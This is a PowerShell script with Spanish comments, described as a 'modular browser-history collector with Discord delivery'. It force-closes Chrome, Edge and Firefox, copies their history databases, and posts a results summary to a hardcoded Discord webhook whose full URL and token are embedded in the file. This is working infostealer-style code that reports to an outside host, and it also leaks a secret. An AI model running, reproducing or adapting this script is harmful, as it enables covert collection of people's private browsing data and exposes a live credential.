<#
.SYNOPSIS
Recolector modular de historiales de navegación con envío a Discord

.DESCRIPTION
Cierra navegadores, copia sus archivos de historial y envía los resultados a un webhook de Discord.

.NOTES
- Diseñado para expansión modular
- Usa métodos no intrusivos
- Requiere un webhook de Discord configurado
#>

# Configuración del Webhook de Discord
$discordWebhookUrl = "https://discord.com/api/webhooks/1348379829598163038/BBTDV8jHgoMyF4sNPi2L_IyAZSsbmrtyuhE7VCAMiT0PVuTPTF-_OqDkWjPfDvC5YBkP"
#tal vez no sea buena idea dejar esto aqui
function Initialize-BackupEnvironment {
    <#
    .SYNOPSIS
    Crea la carpeta de destino para los archivos de historial.
    
    .DESCRIPTION
    Genera una carpeta con timestamp para almacenar los archivos de historial.
    #>
    param(
        [string]$BasePath = "$env:USERPROFILE\Documents\BrowserHistory"
    )

    $timestamp = Get-Date -Format "yyyyMMdd-HHmmss"
    $targetFolder = Join-Path $BasePath $timestamp
    
    if (-not (Test-Path $targetFolder)) {
        New-Item -Path $targetFolder -ItemType Directory -Force | Out-Null
    }
    
    return $targetFolder
}

function Close-Browsers {
    <#
    .SYNOPSIS
    Cierra los navegadores especificados.
    
    .DESCRIPTION
    Detiene los procesos de los navegadores para liberar los archivos de historial.
    #>
    param(
        [string[]]$BrowserProcesses = @('chrome', 'msedge', 'firefox', 'msedgewebview2')
    )

    Write-Host "Cerrando navegadores..." -ForegroundColor Yellow
    
    foreach ($process in $BrowserProcesses) {
        try {
            if (Get-Process $process -ErrorAction SilentlyContinue) {
                Write-Verbose "Cerrando proceso: $process"
                Stop-Process -Name $process -Force -ErrorAction Stop
                Start-Sleep -Milliseconds 500  # Espera para liberación de archivos
            }
        }
        catch {
            Write-Warning "No se pudo cerrar $process : $_"
        }
    }
}

function Backup-BrowserData {
    <#
    .SYNOPSIS
    Copia los archivos de historial de un navegador específico.
    
    .DESCRIPTION
    Realiza una copia del archivo de historial a la carpeta de destino.
    #>
    param(
        [string]$TargetFolder,
        [string]$BrowserName,
        [string]$ProcessName,
        [string]$SourcePath,
        [string]$FileName
    )

    $result = [PSCustomObject]@{
        Browser  = $BrowserName
        Success  = $false
        FilePath = $null
        Error    = $null
    }

    try {
        if (-not (Test-Path $SourcePath)) {
            throw "Archivo no encontrado"
        }

        $destPath = Join-Path $TargetFolder $FileName
        Copy-Item -Path $SourcePath -Destination $destPath -Force
        
        $result.Success = $true
        $result.FilePath = $destPath
    }
    catch {
        $result.Error = $_
    }

    return $result
}

function Send-ToDiscord {
    <#
    .SYNOPSIS
    Envía un mensaje a un webhook de Discord.
    
    .DESCRIPTION
    Envía un mensaje con formato JSON a un canal de Discord usando un webhook.
    #>
    param(
        [string]$WebhookUrl,
        [string]$Message,
        [string]$Username = "Historial Bot",
        [string]$AvatarUrl = ""
    )

    $body = @{
        content = $Message
        username = $Username
        avatar_url = $AvatarUrl
    } | ConvertTo-Json

    try {
        Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $body -ContentType "application/json"
    }
    catch {
        Write-Warning "Error enviando a Discord: $_"
    }
}

#------------------- EJECUCIÓN PRINCIPAL -------------------
$targetFolder = Initialize-BackupEnvironment

# 1. Cierre de navegadores (opcional, comentar si no se necesita)
Close-Browsers

# 2. Recolección de historiales
$backupResults = @()

# Chrome
$backupResults += Backup-BrowserData -TargetFolder $targetFolder `
    -BrowserName "Chrome" -ProcessName "chrome" `
    -SourcePath "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History" `
    -FileName "chrome_history.db"

# Microsoft Edge
$backupResults += Backup-BrowserData -TargetFolder $targetFolder `
    -BrowserName "Edge" -ProcessName "msedge" `
    -SourcePath "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History" `
    -FileName "edge_history.db"

# Firefox
$firefoxPath = Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\places.sqlite" |
               Select-Object -First 1 -ExpandProperty FullName

$backupResults += Backup-BrowserData -TargetFolder $targetFolder `
    -BrowserName "Firefox" -ProcessName "firefox" `
    -SourcePath $firefoxPath `
    -FileName "firefox_places.sqlite"

# 3. Resultados
$backupResults | Format-Table -AutoSize

# 4. Enviar resultados a Discord
$message = "Historiales recolectados:`n"
$message += $backupResults | ForEach-Object {
    "$($_.Browser): $(if ($_.Success) {'exito'} else {'Error'}) - $($_.FilePath)"
} -join "`n"

Send-ToDiscord -WebhookUrl $discordWebhookUrl -Message $message

Write-Host "`nProceso completado. Archivos disponibles en: $targetFolder`n" -ForegroundColor Green